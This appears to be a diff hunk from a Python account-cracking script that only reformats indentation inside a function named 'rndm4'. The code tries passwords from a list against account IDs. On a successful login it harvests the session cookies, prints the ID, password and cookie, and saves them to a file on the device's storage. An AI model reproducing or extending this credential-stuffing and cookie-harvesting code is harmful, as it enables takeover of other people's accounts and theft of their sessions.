@@ -1376,16 +1376,16 @@ def rndm4(uid,passlist):
                            json_response = response.json()
                            if json_response.get('status') == 'ok':
                                if json_response.get('login') == 'success':
-				   session_cookies = session.cookies.get_dict()
-				   coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
-				   print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
-				   print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
-				   open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
-				   oks.append(cid)
-				   return True
+                                   session_cookies = session.cookies.get_dict()
+                                   coki = "; ".join([f"{key}={value}" for key, value in session_cookies.items()])
+                                   print(f'\r\r{G}[{G}BITHIKA-OK{G}]{G} '+cid+f' | '+pas+'\033[1;97m')
+                                   print(f"\r\r{G}[{G}COOKIE{G}]>{R} "+coki)
+                                   open('/sdcard/BITHIKA-RANDOM-M4-OK.txt', 'a').write(cid+' | '+pas+' |-> '+coki+"\n")
+                                   oks.append(cid)
+                                   return True
                         else:
-                               print(f"[ERROR] - Status code: {response.status_code}")
-                               continue
+                                   print(f"[ERROR] - Status code: {response.status_code}")
+                                   continue
                 loop+=1
         except Exception as e:
                 pass
